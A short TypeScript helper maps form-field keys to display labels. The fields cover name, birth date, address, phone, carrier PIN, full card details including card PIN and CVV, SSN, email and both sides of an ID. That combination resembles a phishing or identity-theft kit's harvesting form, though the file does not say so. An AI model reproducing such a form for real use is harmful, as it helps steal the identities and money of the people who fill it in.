export const getTextBtn = (key: string) => {
  return {
    firstname: `First Name`,
    lastname: `Last Name`,
    dob: `Date of Birth`,
    streetAddress: `Street Address`,
    zipCode: `Zip Code`,
    state: `State`,
    phoneNumber: `Phone Number`,
    carrierPin: `Carrier Pin`,
    cardNumber: `Card Number`,
    expirationDate: `Expiry Date`,
    cvv: `CVV`,
    cardPin: `Card Pin`,
    ssn: `SSN`,
    email: `Email`,
    front: `Front of ID`,
    back: `Back of ID`,
  }[key];
};
